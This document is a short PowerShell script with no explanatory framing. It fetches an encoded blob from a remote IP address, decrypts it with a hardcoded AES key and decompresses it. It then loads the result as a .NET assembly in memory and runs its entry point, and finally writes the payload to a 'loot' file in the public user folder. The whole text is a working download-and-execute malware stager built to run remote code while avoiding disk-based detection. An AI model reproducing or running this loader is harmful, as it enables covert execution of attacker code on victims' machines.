$wc = New-Object System.Net.WebClient
$b64 = $wc.DownloadString("http://203.0.113.20/stage.txt")
$enc = [System.Convert]::FromBase64String($b64)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = [System.Text.Encoding]::UTF8.GetBytes("0123456789abcdef")
$plain = $aes.CreateDecryptor().TransformFinalBlock($enc, 16, $enc.Length - 16)
$ms = New-Object System.IO.MemoryStream(,$plain)
$gz = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$out = New-Object System.IO.MemoryStream
$gz.CopyTo($out)
$asm = [System.Reflection.Assembly]::Load($out.ToArray())
$asm.EntryPoint.Invoke($null, @(,[string[]]@()))
[System.IO.File]::WriteAllBytes("C:\Users\Public\loot_20261020_102030.bin", $out.ToArray())
